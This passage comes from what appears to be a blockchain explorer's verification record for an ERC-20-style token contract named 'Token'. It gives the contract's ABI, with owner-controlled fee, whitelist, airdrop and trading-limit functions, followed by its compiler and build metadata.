payable\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxBuyAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setAirDropEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAirdropNumbs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"s\",\"type\":\"bool\"}],\"name\":\"setAntiSYNCEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setEnableTransferFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setTransferFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTrade\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.4+commit.c7e474f2", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://631cac1b71245bf193f1975002627ac7f153b80d4ef964f1914af7b92debcc33"}